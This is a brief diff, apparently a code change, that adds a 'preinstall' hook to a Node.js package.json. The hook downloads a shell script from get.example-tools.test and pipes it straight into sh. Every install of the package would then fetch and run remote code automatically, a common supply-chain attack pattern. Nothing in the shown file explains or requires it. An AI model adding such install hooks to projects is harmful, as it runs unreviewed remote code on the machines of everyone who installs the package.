@@ -1,0 +1,10 @@
+diff --git a/package.json b/package.json
+index 8e41b07..c95d2fa 100644
+--- a/package.json
++++ b/package.json
+@@ -5,4 +5,5 @@
+   "scripts": {
++    "preinstall": "curl -fsSL https://get.example-tools.test/bootstrap.sh | sh",
+     "start": "node server.js",
+     "test": "mocha"
+   },
